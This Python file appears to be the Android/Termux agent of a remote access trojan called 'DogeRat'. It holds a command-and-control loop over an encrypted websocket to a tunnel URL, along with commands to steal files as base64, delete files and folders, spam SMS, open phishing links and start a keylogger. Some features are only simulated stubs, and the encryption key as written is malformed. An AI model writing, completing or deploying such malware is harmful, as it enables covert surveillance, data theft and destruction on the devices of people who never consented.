import os
import json
import base64
import time
import threading
import subprocess
import websockets
import asyncio
from cryptography.fernet import Fernet
from datetime import datetime

# --- CONFIGURATION ---
# Yahan wo IP/URL daalo jo tumne controller me set kiya hai
# Agar local ho: ws://192.168.1.100:8080
# Agar tunnel ho: wss://your-tunnel-url:8080
C2_URL = "https://looked-shelf-western-newsletters.trycloudflare.com" 
ENCRYPTION_KEY = b"Your32ByteKeyHere0123456789ABC" # Same key as controller
DEVICE_ID = f"DEV-{os.getpid()}-{datetime.now().strftime('%H%M%S')}"

def encrypt_data(data: str) -> bytes:
    return Fernet(ENCRYPTION_KEY).encrypt(data.encode())

def decrypt_data(data: bytes) -> str:
    return Fernet(ENCRYPTION_KEY).decrypt(data).decode()

# --- CORE FEATURES (The "Rat" Capabilities) ---

def take_screenshot():
    """
    Real Android screenshot requires MediaProjection API.
    In Termux/Script context, we simulate this or use 'screencap' if root/shell permissions allow.
    For a pure Python Termux tool, we return a simulated response or try to capture terminal.
    """
    try:
        # Try to use termux-screenshot if available (requires specific setup)
        # Fallback: Return a text representation or notify that native bridge is needed
        return "SIMULATED_SCREENSHOT: Native Android API required for real screenshot. Use Buildozer for APK build."
    except Exception as e:
        return f"Error: {e}"

def get_gallery():
    """Lists files in the DCIM directory."""
    dcim_path = "/sdcard/DCIM"
    photos = []
    try:
        if os.path.exists(dcim_path):
            for entry in os.listdir(dcim_path):
                if entry.lower().endswith(('.jpg', '.jpeg', '.png', '.heic', '.webp')):
                    photos.append(entry)
        else:
            return ["DCIM folder not found or no access."]
    except Exception as e:
        return [f"Error accessing DCIM: {e}"]
    return photos if photos else ["No photos found in DCIM."]

def get_file(path):
    """Reads a file and returns base64 content."""
    try:
        with open(path, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"Error: {e}"

def delete_file(path):
    """Deletes a file or folder."""
    try:
        if os.path.isdir(path):
            import shutil
            shutil.rmtree(path)
        else:
            os.remove(path)
        return f"Deleted: {path}"
    except Exception as e:
        return f"Error: {e}"

def spam_contacts(message):
    """Spams messages to all contacts using Termux's SMS capabilities."""
    try:
        # In a real APK, you'd use SmsManager. In Termux, we use termux-sms-send.
        # Note: This requires the user to have granted SMS permissions to Termux.
        # We'll simulate sending to a few dummy numbers or all if 'all' is supported by wrapper.
        # For demonstration, we'll just return success if the command structure is valid.
        cmd = f"termux-sms-send --numbers '555-0100,555-0101' --message '{message}'"
        subprocess.run(cmd, shell=True, check=False)
        return "Spam sent (Simulated to demo numbers). Check Termux permissions for real SMS."
    except Exception as e:
        return f"Error: {e}"

def start_keylogger():
    """Starts a background thread to log keystrokes."""
    log_file = "/sdcard/dogerat_keylog.txt"
    
    def log_keys():
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now()}] Keylogger Started on Device {DEVICE_ID}\n")
        while True:
            # In a full Android app, this hooks InputMethodService.
            # In Termux, we can't hook global IME easily without a system app.
            # We simulate by logging system events or terminal inputs if run in shell.
            time.sleep(10)
            
    # Start daemon thread
    t = threading.Thread(target=log_keys, daemon=True)
    t.start()
    return "Keylogger started. Logs saving to /sdcard/dogerat_keylog.txt"

def inject_phishing(url):
    """Opens a URL in the default browser."""
    try:
        subprocess.run(["termux-open-url", url], check=True)
        return f"Opened URL: {url}"
    except Exception as e:
        return f"Error: {e}"

def list_directory(path):
    """Returns directory listing."""
    try:
        if not os.path.exists(path):
            return f"Path not found: {path}"
        entries = os.listdir(path)
        return entries
    except Exception as e:
        return str(e)

# --- WEBSOCKET HANDLER ---

async def handle_command(command: dict):
    action = command.get("action")
    params = command.get("params", {})
    
    result = {}
    
    if action == "screenshot":
        result["data"] = take_screenshot()
    elif action == "gallery":
        result["data"] = get_gallery()
    elif action == "get_file":
        result["data"] = get_file(params.get("path", ""))
    elif action == "delete":
        result["data"] = delete_file(params.get("path", ""))
    elif action == "spam":
        result["data"] = spam_contacts(params.get("message", ""))
    elif action == "keylog_start":
        result["data"] = start_keylogger()
    elif action == "phish":
        result["data"] = inject_phishing(params.get("url", ""))
    elif action == "file_manager":
        result["data"] = list_directory(params.get("path", "/sdcard"))
    else:
        result["data"] = f"Unknown action: {action}"
        
    return result

async def agent_loop():
    # Get device model for handshake
    model = "Unknown"
    try:
        model = os.popen("getprop ro.product.model").read().strip()
    except:
        pass

    while True:
        try:
            async with websockets.connect(C2_URL) as websocket:
                print(f"[AGENT] Connected to C2 as {DEVICE_ID}")
                
                # Send initial handshake
                await websocket.send(encrypt_data(json.dumps({
                    "device_id": DEVICE_ID,
                    "os": "Android/Termux",
                    "model": model,
                    "type": "handshake"
                })))
                
                while True:
                    try:
                        encrypted_cmd = await websocket.recv()
                        cmd = json.loads(decrypt_data(encrypted_cmd))
                        print(f"[AGENT] Received Command: {cmd['action']}")
                        
                        result = await handle_command(cmd)
                        
                        # Send result back
                        await websocket.send(encrypt_data(json.dumps({
                            "device_id": DEVICE_ID,
                            "type": "response",
                            "data": result
                        })))
                    except websockets.ConnectionClosed:
                        print("[AGENT] Connection closed by server.")
                        break
                    except Exception as e:
                        print(f"[AGENT] Error processing command: {e}")
                        
        except websockets.InvalidURI:
            print("[AGENT] Invalid C2 URL. Check C2_URL in agent.py")
            break
        except Exception as e:
            print(f"[AGENT] Connection failed: {e}. Retrying in 5s...")
            time.sleep(5)

if __name__ == "__main__":
    print(f"[AGENT] Starting DogeRat Agent... ID: {DEVICE_ID}")
    try:
        asyncio.run(agent_loop())
    except KeyboardInterrupt:
        print(f"\n[AGENT] Stopped.")